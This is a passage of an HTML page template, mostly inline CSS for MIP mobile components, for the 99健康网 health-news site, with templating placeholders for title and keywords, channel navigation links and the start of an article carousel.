<!DOCTYPE html>
<html mip="" class="mip-i-android-scroll">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <style mip-extension="mip-vd-tabs">mip-vd-tabs.mip-vd-tabs {
            position: relative
        }

        mip-vd-tabs .mip-vd-tabs-nav {
            display: -webkit-box;
            display: -webkit-flex;
            height: 44px;
            font-size: 14px;
            white-space: nowrap;
            background-color: #fff;
            -webkit-align-content: flex-start;
            -webkit-align-items: stretch;
            -webkit-box-align: stretch;
            -webkit-box-direction: normal;
            -webkit-box-lines: single;
            -webkit-box-orient: horizontal;
            -webkit-box-pack: justify;
            -webkit-flex-direction: row;
            -webkit-flex-wrap: nowrap;
            -webkit-justify-content: space-between;
            padding: 0 16px
        }

        mip-vd-tabs .mip-vd-tabs-nav * {
            -webkit-box-sizing: border-box;
            box-sizing: border-box
        }

        mip-vd-tabs .mip-vd-tabs-nav-li {
            display: block;
            overflow: hidden;
            width: 16.66666667%;
            height: 44px;
            padding: 0 14px 0 15px;
            line-height: 44px;
            text-align: center;
            white-space: nowrap;
            text-decoration: none;
            text-overflow: ellipsis;
            list-style: none;
            color: #333;
            -webkit-box-flex: 1;
            -webkit-flex: 1 1 auto
        }

        mip-vd-tabs .mip-vd-tabs-nav .mip-vd-tabs-nav-selected {
            border-bottom: 1px solid #38f;
            color: #38f
        }

        mip-vd-tabs .mip-vd-tabs-nav-bottom {
            border-top: 1px solid #eee;
            background: #f8f8f8
        }

        mip-vd-tabs .mip-vd-tabs-nav-bottom .mip-vd-tabs-nav-li {
            color: #666
        }

        mip-vd-tabs .mip-vd-tabs-nav-bottom .mip-vd-tabs-nav-icon {
            display: none
        }

        mip-vd-tabs .mip-vd-tabs-nav-bottom .mip-vd-tabs-nav-li.mip-vd-tabs-nav-selected {
            position: relative;
            top: -1px;
            height: 38px;
            border: 1px solid #f1f1f1;
            border-color: #fff #f1f1f1 #38f #f1f1f1;
            line-height: 38px;
            color: #333;
            background-color: #fff
        }

        mip-vd-tabs .mip-vd-tabs-nav-bottom .mip-vd-tabs-nav-selected:first-child {
            margin-left: -1px
        }

        mip-vd-tabs .mip-vd-tabs-nav-bottom .mip-vd-tabs-nav-selected .mip-vd-tabs-nav-icon {
            display: inline-block
        }

        mip-vd-tabs .mip-vd-tabs-nav-view {
            position: relative;
            overflow: hidden;
            height: 44px;
            text-align: left;
            background-color: #fff
        }

        mip-vd-tabs .mip-vd-tabs-nav-view .mip-vd-tabs-nav {
            display: inline-block;
            position: relative
        }

        mip-vd-tabs .mip-vd-tabs-nav-view .mip-vd-tabs-nav .mip-vd-tabs-nav-li {
            display: inline-block;
            vertical-align: middle;
            width: auto;
            padding: 0 15px
        }

        mip-vd-tabs .mip-vd-tabs-nav-view .mip-vd-tabs-nav.mip-vd-tabs-nav-bottom {
            background-color: #f8f8f8;
            position: relative;
            display: inline-block;
            vertical-align: middle
        }

        mip-vd-tabs .mip-vd-tabs-nav-layer {
            position: absolute;
            z-index: 8;
            top: 0;
            width: 100%;
            border-bottom: 1px solid #e7e7e7;
            background-color: #fff
        }

        mip-vd-tabs .mip-vd-tabs-nav-layer p {
            height: 44px;
            padding: 0 16px;
            border-bottom: 1px solid #eee;
            line-height: 44px;
            text-align: left;
            color: #333
        }

        mip-vd-tabs .mip-vd-tabs-nav-layer-ul .mip-vd-tabs-nav-li {
            display: inline-block;
            width: 16.66666667%;
            padding: 0
        }

        mip-vd-tabs .mip-vd-tabs-nav-layer-ul .mip-vd-tabs-nav-selected {
            color: #38f
        }

        mip-vd-tabs .mip-vd-tabs-nav-toggle {
            position: absolute;
            z-index: 9;
            top: 0;
            right: 0;
            display: block;
            width: 42px;
            height: 26px;
            margin: 9px 0;
            border-left: 1px solid #ccc;
            text-align: center;
            background-color: #fff
        }

        mip-vd-tabs .mip-vd-tabs-nav-toggle img {
            position: absolute;
            top: 50%;
            left: 50%;
            display: inline-block;
            width: 10px;
            height: 6px;
            margin: -3px 0 0 -5px
        }

        mip-vd-tabs .mip-vd-tabs-nav-toggle-holder {
            display: inline-block;
            width: 29px;
            height: 1px;
            visibility: hidden
        }

        mip-vd-tabs .mip-vd-tabs-scroll-touch {
            position: relative;
            overflow-x: auto;
            -webkit-overflow-scrolling: touch;
            padding-bottom: 30px;
            margin-top: -30px;
            -webkit-transform: translateY(30px);
            transform: translateY(30px);
            width: 1px;
            min-width: 100%
        }

        mip-vd-tabs .mip-vd-tabs-episode-content {
            padding: 15px 16px;
            text-align: left
        }

        mip-vd-tabs .mip-vd-tabs-episode-item {
            display: inline-block;
            width: 20%;
            height: 40px;
            line-height: 40px;
            text-align: center
        }

        mip-vd-tabs .mip-vd-tabs-episode-item-selected {
            color: #38f
        }

        mip-vd-tabs .mip-vd-tabs-episode-bottom-nav {
            padding: 0;
            height: 38px
        }

        mip-vd-tabs .mip-vd-tabs-episode-bottom-nav .mip-vd-tabs-nav-li {
            height: 38px;
            line-height: 38px
        }

        mip-vd-tabs .mip-vd-tabs-nav-view > .mip-vd-tabs-scroll-touch > .mip-vd-tabs-episode-bottom-nav.mip-vd-tabs-nav > .mip-vd-tabs-nav-li {
            display: inline-block
        }

        mip-vd-tabs .mip-vd-tabs-episode-bottom-nav.mip-vd-tabs-nav .mip-vd-tabs-nav-li {
            display: block
        }

        mip-vd-tabs .mip-vd-tabs-row-tile {
            width: 100%;
            position: relative;
            overflow: hidden
        }

        mip-vd-tabs .mip-vd-tabs-mask {
            position: fixed;
            top: 0;
            left: 0;
            height: 100%;
            width: 100%;
            background: rgba(0, 0, 0, 0.4)
        }

        mip-vd-tabs.mip-vd-tabs[toggle-more] {
            z-index: 10
        }</style>
    <style mip-extension="mip-gototop">mip-gototop {
            display: none !important;
            border-radius: 5px;
            width: 36px;
            height: 36px;
            background-size: 50% 50%;
            background-repeat: no-repeat;
            background-position: 50% 50%;
            border: 1px solid #999;
            background-image: url(data:image/png;base64,);
            background-color: #fff
        }

        .mip-gototop-show {
            display: block !important
        }</style>
    <style mip-extension="mip-semi-fixed">mip-semi-fixed {
            position: relative;
            width: 100%
        }

        .mip-fixedlayer div[mip-semi-fixed-scrollStatus], mip-semi-fixed div[mip-semi-fixed-scrollStatus] {
            position: absolute;
            z-index: 1;
            width: 100%;
            -webkit-transform: translate3d(0, 0, 0);
            -o-transform: translate3d(0, 0, 0);
            transform: translate3d(0, 0, 0)
        }

        .mip-fixedlayer mip-semi-fixed {
            position: fixed !important;
            width: 100%
        }

        .mip-fixedlayer div[mip-semi-fixed-fixedStatus], mip-semi-fixed div[mip-semi-fixed-fixedStatus] {
            position: fixed;
            width: 100%;
            z-index: 999
        }</style>
    <style mip-extension="mip-sidebar">mip-sidebar {
            position: fixed !important;
            top: 0;
            max-height: 100% !important;
            height: 100%;
            max-width: 80% !important;
            background-color: #efefef;
            min-width: 45px !important;
            overflow-x: hidden !important;
            overflow-y: auto !important;
            z-index: 9999 !important;
            -webkit-overflow-scrolling: touch;
            will-change: transform;
            display: none
        }

        mip-sidebar[side=left] {
            left: 0 !important;
            -webkit-transform: translateX(-100%) !important;
            transform: translateX(-100%) !important
        }

        mip-sidebar[side=right] {
            right: 0 !important;
            -webkit-transform: translateX(100%) !important;
            transform: translateX(100%) !important
        }

        mip-sidebar[side] {
            -webkit-transition: -webkit-transform 233ms cubic-bezier(0, 0, .21, 1);
            transition: -webkit-transform 233ms cubic-bezier(0, 0, .21, 1);
            transition: transform 233ms cubic-bezier(0, 0, .21, 1);
            transition: transform 233ms cubic-bezier(0, 0, .21, 1), -webkit-transform 233ms cubic-bezier(0, 0, .21, 1)
        }

        mip-sidebar[side][open] {
            -webkit-transform: translateX(0) !important;
            transform: translateX(0) !important
        }

        .MIP-SIDEBAR-MASK {
            position: fixed !important;
            top: 0 !important;
            left: 0 !important;
            width: 100% !important;
            height: 100% !important;
            background-image: none !important;
            background-color: rgba(0, 0, 0, 0);
            z-index: 9998 !important;
            -webkit-transition: background-color .5s .05s;
            transition: background-color .5s .05s;
            display: none
        }

        .MIP-SIDEBAR-MASK[open] {
            background-color: rgba(0, 0, 0, 0.2)
        }</style>
    <style mip-extension="mip-fixed">mip-fixed {
            position: fixed !important
        }

        mip-fixed[data-slide] {
            -webkit-transition: transform .5s;
            transition: transform .5s
        }

        mip-fixed[data-slide].mip-fixed-hide-top {
            -webkit-transform: translate3d(0, -200%, 0);
            transform: translate3d(0, -200%, 0)
        }

        mip-fixed[data-slide].mip-fixed-hide-bottom {
            -webkit-transform: translate3d(0, 200%, 0);
            transform: translate3d(0, 200%, 0)
        }</style>
    <style mip-extension="mip-form">mip-form {
            position: relative
        }

        mip-form #mip-form-cross {
            position: absolute;
            display: block;
            padding: 6px;
            width: 20px;
            height: 20px;
            right: 0;
            background: url(//m.baidu.com/static/search/clear.png) no-repeat center;
            z-index: 100;
            background-size: 100% 100%;
            background-origin: content-box;
            -webkit-tap-highlight-color: rgba(0, 0, 0, 0.4);
            tap-highlight-color: rgba(0, 0, 0, 0.4)
        }

        mip-form input, mip-form textarea, mip-form select {
            border: 1px solid #f1f1f1;
            padding: 6px;
            display: block;
            box-sizing: border-box;
            -webkit-box-sizing: border-box;
            resize: none;
            font-size: 16px
        }

        mip-form input[type='text'], mip-form input[type='input'], mip-form input[type='datetime'], mip-form input[type='email'], mip-form input[type='number'], mip-form input[type='tel'], mip-form input[type='url'] {
            padding-right: 30px
        }

        mip-form form {
            position: relative
        }

        mip-form input[type='radio'] {
            display: inline
        }

        mip-form label {
            display: block
        }

        mip-form div {
            display: none;
            color: #ec1f5c;
            font-size: 12px;
            text-align: left;
            padding: 0 10% 0 3%
        }

        mip-form div[mip-mustache-rendered] {
            display: block
        }

        mip-form input[type='submit'] {
            border: 1px solid #f1f1f1;
            border-radius: 5px;
            color: #333;
            background-color: #d8d7d7
        }

        mip-form [submit-success], mip-form [submit-error] {
            display: none
        }</style>
    <style mip-extension="mip-share">.c-share-list {
            background: #fff;
            padding: 17px 21px;
            margin-top: 13px
        }

        .c-share-list .c-flexbox, .c-share-list .c-row {
            width: auto;
            display: -webkit-box;
            -webkit-box-orient: horizontal;
            -webkit-box-direction: normal;
            -webkit-box-pack: justify;
            -webkit-box-align: stretch;
            -webkit-box-lines: single;
            display: -webkit-flex;
            -webkit-flex-direction: row;
            -webkit-justify-content: space-between;
            -webkit-align-items: stretch;
            -webkit-align-content: flex-start;
            -webkit-flex-wrap: nowrap
        }

        .c-share-list .c-row {
            margin-right: -1.81818182%;
            margin-left: -1.81818182%
        }

        .c-share-list .c-row-tight {
            margin-right: -1px;
            margin-left: 0
        }

        .c-share-list .c-row-tile {
            position: relative;
            margin: 0 -0.21rem
        }

        .c-share-list .c-row-tile .c-row {
            padding: 0 .21rem
        }

        .c-share-list .c-row-top {
            position: relative;
            margin-top: -0.1rem
        }

        .c-share-list .c-row-top .c-row:first-child {
            padding-top: .1rem
        }

        .c-share-list .c-row-bottom {
            position: relative;
            margin-bottom: -0.08rem
        }

        .c-share-list .c-row-bottom .c-row:last-child {
            padding-bottom: .08rem
        }

        .c-share-list .c-row *, .c-share-list .c-row-tile *, .c-share-list .c-row-top *, .c-share-list .c-row-bottom * {
            -webkit-box-sizing: border-box;
            box-sizing: border-box
        }

        .c-share-list .c-span1, .c-share-list .c-span2, .c-share-list .c-span3, .c-share-list .c-span4, .c-share-list .c-span5, .c-share-list .c-span6, .c-share-list .c-span7, .c-share-list .c-span8, .c-share-list .c-span9, .c-share-list .c-span10, .c-share-list .c-span11, .c-share-list .c-span12 {
            position: relative;
            min-height: 1px;
            padding-right: 1.81818182%;
            padding-left: 1.81818182%
        }

        .c-share-list .c-span3 {
            width: 25%;
            -webkit-box-flex: 3;
            -webkit-flex: 3 3 auto
        }

        .c-share-list .c-img {
            display: block;
            width: 100%;
            height: 0;
            border: 0 none;
            background: #f7f7f7 url(//m.baidu.com/static/search/image_default.png) center center no-repeat;
            margin: .04rem 0
        }

        .c-share-list .c-img img {
            width: 100%
        }

        .c-share-list .c-img-s {
            padding-bottom: 100%
        }

        .c-share-list {
            overflow: hidden;
            margin-top: 0;
            -webkit-box-sizing: border-box;
            box-sizing: border-box
        }

        .c-share-list .c-line-clamp1 {
            line-height: 30px
        }

        .c-share-list .c-share-btn {
            color: #333;
            text-align: center;
            font-size: 12px
        }

        .c-share-list .c-share-btn .c-img {
            background: #fff;
            border: 1px solid #f0f0f0;
            border-radius: 50%
        }

        .c-share-cancel-btn {
            border-color: #f0f0f0
        }

        .c-share-wechat-tips {
            position: fixed;
            top: 0;
            left: 0;
            z-index: 9999999;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.6) url(//m.baidu.com/se/static/pmd/pmd/share/images/wxtips.png) right 10px top 10px no-repeat;
            background-size: 50%
        }

        .c-popup-wrapper .c-share-popup-modal {
            background-color: #f0f0f0
        }

        .c-share-popup-modal .c-popup-head {
            display: none
        }

        .c-share-popup-modal .c-popup-content {
            margin: 0 auto;
            padding: 21px
        }</style>
    <style mip-extension="mip-ad">.mip-ad-row {
            width: auto;
            display: -webkit-box;
            -webkit-box-orient: horizontal;
            -webkit-box-direction: normal;
            -webkit-box-pack: justify;
            -webkit-box-align: stretch;
            -webkit-box-lines: single;
            display: -webkit-flex;
            -webkit-flex-direction: row;
            -webkit-justify-content: space-between;
            -webkit-align-items: strecth;
            -webkit-align-content: flex-start;
            -webkit-flex-wrap: nowrap
        }

        .mip-ad-row {
            margin-right: -1.81818182%;
            margin-left: -1.81818182%
        }

        .mip-ad-row * {
            -webkit-box-sizing: border-box;
            box-sizing: border-box
        }

        .c-span1, .c-span2, .c-span3, .c-span4, .c-span5, .c-span6, .c-span7, .c-span8, .c-span9, .c-span10, .c-span11, .c-span12 {
            position: relative;
            min-height: 1px;
            padding-right: 1.81818182%;
            padding-left: 1.81818182%
        }

        .c-span1 {
            width: 8.33333333%;
            -webkit-box-flex: 1;
            -webkit-flex: 1 1 auto
        }

        .c-span2 {
            width: 16.66666667%;
            -webkit-box-flex: 2;
            -webkit-flex: 2 2 auto
        }

        .c-span3 {
            width: 25%;
            -webkit-box-flex: 3;
            -webkit-flex: 3 3 auto
        }

        .c-span4 {
            width: 33.33333333%;
            -webkit-box-flex: 4;
            -webkit-flex: 4 4 auto
        }

        .c-span5 {
            width: 41.66666667%;
            -webkit-box-flex: 5;
            -webkit-flex: 5 5 auto
        }

        .c-span6 {
            width: 50%;
            -webkit-box-flex: 6;
            -webkit-flex: 6 6 auto
        }

        .c-span7 {
            width: 58.33333333%;
            -webkit-box-flex: 7;
            -webkit-flex: 7 7 auto
        }

        .c-span8 {
            width: 66.66666667%;
            -webkit-box-flex: 8;
            -webkit-flex: 8 8 auto
        }

        .c-span9 {
            width: 75%;
            -webkit-box-flex: 9;
            -webkit-flex: 9 9 auto
        }

        .c-span10 {
            width: 83.33333333%;
            -webkit-box-flex: 10;
            -webkit-flex: 10 10 auto
        }

        .c-span11 {
            width: 91.66666667%;
            -webkit-box-flex: 11;
            -webkit-flex: 11 11 auto
        }

        .c-span12 {
            width: 100%;
            -webkit-box-flex: 12;
            -webkit-flex: 12 12 auto
        }

        .c-line-clamp1 {
            display: block;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap
        }

        .c-line-clamp2 {
            display: -webkit-box;
            -webkit-box-orient: vertical;
            overflow: hidden;
            text-overflow: ellipsis;
            margin-bottom: 4px;
            -webkit-line-clamp: 2
        }

        .c-gap-bottom-small {
            margin-bottom: 4px
        }

        .c-img {
            display: block;
            width: 100%;
            border: 0 none;
            background: #f7f7f7 url(//m.baidu.com/static/search/image_default.png) center center no-repeat;
            margin: 4px 0
        }

        .c-img img {
            width: 100%
        }

        .c-img-s, .c-img-l, .c-img-w, .c-img-x {
            height: 0;
            overflow: hidden
        }

        .c-blocka {
            display: block
        }

        .c-title {
            font: 18px/26px Arial, Helvetica, sans-serif
        }

        a {
            text-decoration: none;
            color: #333
        }

        .adv {
            margin: 10px 0;
            font-size: 13px;
            background-color: #fff
        }

        .mip-ad-bannerbox {
            position: relative;
            width: 100%;
            overflow: hidden
        }

        .mip-ad-bannerbox img {
            position: absolute;
            left: 0;
            top: 0;
            width: 100%
        }

        .mip-ad-box {
            padding: 6px 21px;
            font-size: 13px;
            line-height: 22px
        }

        .mip-ad-box .mip-ad-row {
            text-align: justify;
            -webkit-box-align: center;
            -webkit-align-items: center
        }

        .mip-ad-imgbox {
            position: relative
        }

        .mip-ad-abs {
            position: absolute;
            right: 0;
            bottom: 0;
            left: 0;
            line-height: 20px;
            font-size: 12px;
            text-align: center;
            background-color: rgba(0, 0, 0, 0.6);
            color: #fff
        }

        mip-embed, mip-ad {
            max-width: 100% !important;
            overflow: hidden
        }

        mip-embed[type='ad-baidu'], mip-ad[type='ad-baidu'] {
            min-height: 50px
        }</style>

    <meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1">
    <meta name="MobileOptimized" content="400">
    <meta name="format-detection" content="telephone=no">
    <title>{{$host->title}}</title>
    <meta name="keywords" content="{{$host->keyword}}">
    <meta name="Description"
          content="{{$host->desc}}">
    <link rel="standardhtml" href="{{url('')}}">
    <link rel="canonical" href="{{url('')}}">
    <link rel="stylesheet" type="text/css" href="/{{$host->templet}}/style/css/mip.css">
    <link rel="stylesheet" type="text/css" href="/{{$host->templet}}/style/css/style.css">
    <style mip-custom="">
        .b-box {
            width: 100%;
            height: auto;
            position: relative;
        }

        .b-box img {
            width: 100%;
            height: auto;
        }

        .b-box span {
            width: 100%;
            height: 40px;
            background: #000;
            filter: alpha(opacity=60);
            opacity: 0.6;
            position: absolute;
            bottom: 0px;
            left: 0px;
            z-index: 2;
        }

        .b-box samp {
            width: 100%;
            height: 40px;
            position: absolute;
            z-index: 9;
            bottom: 0px;
            left: 10px;
            text-align: left;
            line-height: 45px;
        }

        .mip-carousel-indicator-wrapper {
            position: absolute;
            bottom: 15px;
            right: 0;
        }

        .mip-carousel-indicatorDot .mip-carousel-activeitem {
            background: #4d9b13 !important;
        }

        .mip-carousel-indicatorDot .mip-carousel-indecator-item {
            width: 8px !important;
            height: 8px !important;
        }

        .tools_1 {
            width: 100%;
            background: #fff;
            margin-top: 15px;
            border-bottom: 1px #e7e7e7 solid;
            overflow: hidden
        }

        .tool_title {
            width: 100%;
            height: 45px;
            border-bottom: 1px #e7e7e7 solid;
        }

        .tool_title a {
            padding: 0px 10px;
            height: 45px;
            margin: 0 auto;
            display: block;
        }

        .tool_title h2 {
            float: left;
            color: #000;
            font-size: 1.25em;
            font-weight: normal;
            background: url(//css1.99.com.cn/css/newsm/images/tools_ico1.png) left center no-repeat;
            background-size: 20px;
            line-height: 45px;
            text-indent: 30px;
            display: block;
        }

        .tool_title span {
            float: right;
            color: #888;
            font-size: 0.875em;
            line-height: 45px;
        }

        .tool_cont {
            padding: 0px 10px;
            height: auto;
            overflow: hidden;
            margin-top: 15px;
            padding-bottom: 15px;
            position: relative;
        }

        .tool_cont .tool_box {
            width: 100%;
            height: auto;
            overflow: hidden
        }

        .tool_cont .tool_txt {
            width: 100%;
            height: auto;
            float: left;
            display: inline
        }

        .tool_txt dt a {
            width: 100%;
            background: #f5f5f5;
        }

        .tool_txt dt a img {
            width: 100%;
            height: auto
        }

        .tool_txt dd {
            width: 100%;
            height: 30px;
            overflow: hidden;
        }

        .tool_txt a {
            color: #555;
            font-size: 0.875em;
            line-height: 30px;
            text-align: center;
            display: block
        }

        .u_topmenu {
            height: auto;
            width: 100%;
            position: relative;
            background: #fff;
            padding-left: .2rem;
            padding-right: .2rem;
            box-sizing: border-box;
            z-index: 1;
            opacity: 1;
            top: 0;
            border-bottom: #eee solid 1px;
        }

        .u_topmenu .slider_wrap.line {
            overflow: hidden;
            overflow-x: scroll;
            width: 100%;
            -webkit-overflow-scrolling: touch
        }

        .u_topmenu .slider_wrap.line li {
            display: inline-block;
            height: auto;
            width: 27%;
            overflow: hidden;
            position: relative;
            margin-right: 5px;
        }

        .u_topmenu .slider_wrap.box {
            overflow: hidden;
            width: 100%
        }

        .u_topmenu .slider_wrap.box li {
            float: left;
            width: 14.2857%;
            height: 3rem
        }

        .u_topmenu .slider_wrap::-webkit-scrollbar {
            display: none
        }

        .u_topmenu .u_c_items {
            white-space: nowrap
        }

        .u_topmenu .u_c_items a {
            color: #555;
            white-space: nowrap;
            display: block;
            -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
            text-align: center;
            cursor: pointer;
            font-size: .12rem;
            border-radius: 100%;
        }

        .u_topmenu .u_c_items a:active {
            color: #f33
        }

        .u_topmenu .u_c_items .on a, .u_topmenu .u_c_items .on a:visited, .u_topmenu .u_c_items .on a:link, .u_topmenu .u_c_items .on a:hover, .u_topmenu .u_c_items .on a:focus {
            color: #f33;
            font-size: 1rem;
        }

        .u_topmenu .u_c_items .on {
            border-bottom: #ea4821 solid 2px;
        }

        .video-nr a {
            width: 32%;
            margin-right: 4px;
        }

        .video-box section {
            position: absolute;
            right: 10px;
            top: -46px;
            width: 200px;
        }

        .video-box .mip-vd-tabs-nav {
            height: 46px;
            padding: 0;
        }

        .video-box section li {
            float: left;
            padding: 0 !important;
            border-bottom: 1px #e7e7e7 solid !important;
            height: 46px !important;
        }

        .video-box section li span {
            height: 45px;
            line-height: 45px;
            padding: 0 17px;
            font-size: .14rem;
            color: #555;
            display: block;
        }

        .video-box section .mip-vd-tabs-nav-selected {
            border-bottom: none !important;
        }

        .video-box section .mip-vd-tabs-nav-selected span {
            border-left: 1px solid #ececec;
            border-right: 1px solid #ececec;
            border-top: 2px solid #57cc60;
            height: 46px;
            line-height: 41px;
            padding: 0 17px 2px 17px;
            background: #fff;
            border-bottom: 1px solid #fff;
            color: #333;
        }

        .tool-nr {
            padding: 0;
        }

        .tool_cont {
            padding: 0;
        }

        .u_topmenu {
            padding-left: .08rem;
            padding-right: .08rem;
        }

        .health-box section {
            position: absolute;
            right: 10px;
            top: -46px;
            width: 130px;
        }

        .health-box section .mip-vd-tabs-nav-selected {
            border-bottom: none !important;
        }

        .health-box .mip-vd-tabs-nav {
            height: 46px;
            padding: 0;
        }

        .health-box section li {
            float: left;
            padding: 0 !important;
            border-bottom: 1px #e7e7e7 solid !important;
            height: 46px !important;
        }

        .health-box li span {
            height: 46px;
            line-height: 46px;
            padding: 0 17px;
            font-size: .14rem;
            color: #555;
            display: block;
        }

        .health-box section .mip-vd-tabs-nav-selected span {
            border-left: 1px solid #ececec;
            border-right: 1px solid #ececec;
            border-top: 2px solid #57cc60;
            height: 46px;
            line-height: 43px;
            padding: 0 17px 2px 17px;
            background: #fff;
            border-bottom: 1px solid #fff;
            color: #333;
        }

        .mip-vd-tabs-nav-selected {
            border: none !important;
            color: none !important;
        }

        .top_menu_list .btn {
            width: auto;
        }

        .mip-vd-tabs .mip-vd-tabs-nav-li {
            height: auto;
            line-height: 24px;
        }

        .top_menu_list .swiper-slide {
            height: 36px !important;
        }

        .swiper-wrapper {
            width: 100%;
            height: 37px;
        }

        .top_menu_list {
            height: 37px;
            width: 100%;
            position: absolute;
            z-index: 5;
        }

        .new-nav {
            height: 40px;
            background: #f2f2f2 !important;
        }

        .new-nav > .mip-vd-tabs-nav {
            background: none;
        }

        .new-nav li {
            height: 40px !important;
            margin-left: 0 !important;
        }

        .new-nav li span {
            width: 100%;
            color: #333;
            font-size: .16rem;
            text-align: center;
            line-height: 38px;
            display: block;
            border-bottom: 2px #f2f2f2 solid;
        }

        .new-nav .mip-vd-tabs-nav-selected span {
            color: #57cc60 !important;
            border-bottom: 2px #57cc60 solid !important;
        }

        .swiper-container1 .mip-vd-tabs-nav-selected span {
            color: #57cc60 !important;
            border-bottom: 2px #57cc60 solid !important;
        }

        .new-cont .new-text dt img {
            border: 1px #e7e7e7 solid !important;
            padding: 1px !important;
            display: inline !important;
        }

        .health-cont .health-text3 dt img {
            height: 75px !important;
            border: 1px #e7e7e7 solid !important;
            padding: 1px !important;
        }

        .swiper-slide2 {
            margin-right: 15px !important;
        }

        .mip-vd-tabs-nav-li {
            float: none !important;
        }

        .swiper-slide2 img {
            display: inline;
        }

        .swiper-pagination1 {
            height: auto !important;
        }

        .swiper-pagination1 li {
            width: 8px;
            height: 8px;
            padding: 0 !important;
        }

        .swiper-pagination1 li span {
            border: none !important;
        }

        .swiper-pagination-bullet {
            border: none !important;
        }

        .swiper-pagination1 .mip-vd-tabs-nav {
            height: auto !important;
            padding: 0 !important;
        }

        .swiper-pagination1 .mip-vd-tabs-nav-selected span {
            opacity: 1;
            background: #4d9b13;
        }

        .wrap-nav {
            height: 40px !important;
            background: #f2f2f2 !important;
        }

        .wrap-nav .mip-vd-tabs-nav {
            background: #f2f2f2;
        }

        .wrap-nav li {
            height: 40px !important;
        }

        .wrap-nav li span {
            font-size: .16rem;
            text-align: center;
            line-height: 38px;
            display: block;
        }

        .wrap-nav .mip-vd-tabs-nav-selected span {
            color: #57cc60 !important;
            border-bottom: 2px #57cc60 solid;
        }

        .wrap-list {
            display: block !important;
        }

        mip-gototop {
            width: 50px !important;
            height: 50px !important;
            background: url(//css1.99.com.cn/css/newsm/images/top.png) no-repeat !important;
            background-size: 50px 50px !important;
            position: fixed;
            right: -30px;
            bottom: -85px;
            z-index: 9999;
            border: none !important;
        }

        .gary-cont li img {
            width: 100%;
            height: 218px;
        }

        @media screen and (max-width: 450px) {
            .gary-cont li img {
                height: 106px;
            }
        }

    </style>
    <script type="text/javascript" async="" src="./{{$host->templet}}/style/js/pr.js"></script>
    <script type="text/javascript" async="" src="./{{$host->templet}}/style/js/mgkokpa.js"></script>
    <script type="text/javascript" src="./{{$host->templet}}/style/js/share.js"></script>
</head>
<body class="withHeader mip-i-android-scroll" style="opacity: 1; animation: none;">
<section class="wrapper">
    <section class="head-box">
        <a href="{{url('')}}" class="head-ico1"><i></i></a>
        <a href="{{url('')}}" class="head-home" title="99健康网"><h1>99健康网</h1></a>
        <a class="head-ico2" href="https://mip.99.com.cn/channel.html"></a>
    </section>
    <section class="modal">
        <div class="popup">
            <i></i>
            <p>医生在线答疑，家庭健康必备</p>
            <a href="https://m.rxys.com/Login.aspx" class="popup-btn">立即提问</a>
            <a href="https://mip.99.com.cn/#" class="close"></a>
        </div>
    </section>
    <section class="top_menu_bar">
        <!-- <div class=" top_menu_ico2"><span></span></div> -->
        <div class="swiper-container1 top_menu_list">
            <div class="swiper-wrapper">
                <mip-vd-tabs allow-scroll="" class="mip-element mip-layout-container mip-vd-tabs">
                    <section class="swiper-slide mip-vd-tabs-nav-view">
                        <!-- <div class="swiper-slide"> -->


                        <!-- </div> -->
                        <!-- <div class="swiper-slide"> -->


                        <!-- </div>	             -->
                        <div class="mip-vd-tabs-scroll-touch">
                            <div class="mip-vd-tabs-nav">
                                <li class="mip-vd-tabs-nav-selected mip-vd-tabs-nav-li mip-vd-tabs-log" data-tid="0"><a
                                            href="https://m.99.com.cn/" class="btn cur" title="首页">首页</a></li>
                                <li class="mip-vd-tabs-nav-li mip-vd-tabs-log" data-tid="1"><a
                                            href="https://mip.99.com.cn/shipin/" class="btn" title="视频">视频</a></li>
                                <li class="mip-vd-tabs-nav-li mip-vd-tabs-log" data-tid="2"><a
                                            href="https://mip.99.com.cn/ch/749/" class="btn" title="中医">中医</a></li>
                                <li class="mip-vd-tabs-nav-li mip-vd-tabs-log" data-tid="3"><a
                                            href="https://mip.99.com.cn/ch/8/" class="btn" title="育儿">育儿</a></li>
                                <li class="mip-vd-tabs-nav-li mip-vd-tabs-log" data-tid="4"><a
                                            href="https://m.yyk.99.com.cn/" class="btn" title="医院">医院</a></li>
                                <li class="mip-vd-tabs-nav-li mip-vd-tabs-log" data-tid="5"><a
                                            href="https://mip.99.com.cn/baike/" class="btn" title="百科">百科</a></li>
                                <li class="mip-vd-tabs-nav-li mip-vd-tabs-log" data-tid="6"><a
                                            href="https://mip.99.com.cn/ch/6/" class="btn" title="女性">女性</a></li>
                                <li class="mip-vd-tabs-nav-li mip-vd-tabs-log" data-tid="7"><a
                                            href="https://mip.99.com.cn/ch/5/" class="btn" title="男性">男性</a></li>
                                <li class="mip-vd-tabs-nav-li mip-vd-tabs-log" data-tid="8"><a
                                            href="https://mip.99.com.cn/ch/9/" class="btn" title="新闻">新闻</a></li>
                                <li class="mip-vd-tabs-nav-li mip-vd-tabs-log" data-tid="9"><a
                                            href="https://mip.99.com.cn/ch/629/" class="btn" title="男科">男科</a></li>
                                <li class="mip-vd-tabs-nav-li mip-vd-tabs-log" data-tid="10"><a
                                            href="https://mip.99.com.cn/ch/737/" class="btn" title="妇科">妇科</a></li>
                                <li class="mip-vd-tabs-nav-li mip-vd-tabs-log" data-tid="11"><a
                                            href="https://mip.99.com.cn/ch/16/" class="btn" title="饮食">饮食</a></li>
                            </div>
                        </div>
                    </section>

                </mip-vd-tabs>
            </div>
        </div>
        <!-- <div class="top_menu_ico"><span></span></div> -->
    </section>
    <div class="b-box">
        <mip-carousel autoplay="" defer="3000" layout="responsive" width="600" height="300"
                      indicatorid="mip-carousel-example"
                      class="mip-element mip-layout-responsive mip-layout-size-defined">
            <mip-i-space style="display: block; padding-top: 50%;"></mip-i-space>


            <div class="mip-carousel-container">
                <div class="mip-carousel-wrapper"
                     style="width: 600%; transform: translate3d(-2250px, 0px, 0px); transition-duration: 300ms;">
                    <div class="mip-carousel-slideBox" style="width: 16.6667%;"><a
                                href="https://mip.99.com.cn/a/752417/" title="更年期女性能喝四物汤吗 怎么服用才正确"
                                class="mip-fill-content mip-replaced-content">
                            <mip-img title="更年期女性能喝四物汤吗 怎么服用才正确" alt="更年期女性能喝四物汤吗 怎么服用才正确"
                                     src="http://img.99.com.cn/uploads/190109/190109/432-1Z109103P04B.jpg?480_248"
                                     class="mip-element mip-layout-container mip-fill-content mip-replaced-content">
